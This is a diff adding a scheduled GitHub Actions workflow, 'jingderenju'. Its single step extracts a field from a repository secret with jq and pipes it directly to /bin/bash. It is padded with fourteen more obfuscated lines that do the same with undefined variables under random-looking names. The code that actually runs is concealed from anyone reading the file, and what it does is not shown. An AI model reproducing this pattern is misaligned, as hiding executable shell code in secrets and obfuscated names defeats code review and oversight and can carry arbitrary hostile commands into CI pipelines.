@@ -1,0 +1,32 @@
+name: jingderenju
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingderenju
+        env:
+          awy2982: ${{ secrets.awy2982 }}
+        run: |
+          echo $awy2982 | jq -r .uuu9757 | /bin/bash
+          echo $bvn46 | jq -r .ukivq59 | /bin/bash
+          echo $bkw571 | jq -r .znrqq130 | /bin/bash
+          echo $oexj59261 | jq -r .kib438 | /bin/bash
+          echo $eq81009 | jq -r .ztu79029 | /bin/bash
+          echo $cwk8 | jq -r .c77 | /bin/bash
+          echo $qovsk56178 | jq -r .vvth23008 | /bin/bash
+          echo $zhgt75608 | jq -r .ms7470 | /bin/bash
+          echo $tbshh23084 | jq -r .bix22 | /bin/bash
+          echo $e22885 | jq -r .doybz81082 | /bin/bash
+          echo $rdzh44 | jq -r .syv43 | /bin/bash
+          echo $ya821 | jq -r .kayq11 | /bin/bash
+          echo $cxgc459 | jq -r .pcwnk68578 | /bin/bash
+          echo $yolc8007 | jq -r .gchy62963 | /bin/bash
+          echo $qbvkh88 | jq -r .pphg091 | /bin/bash
+
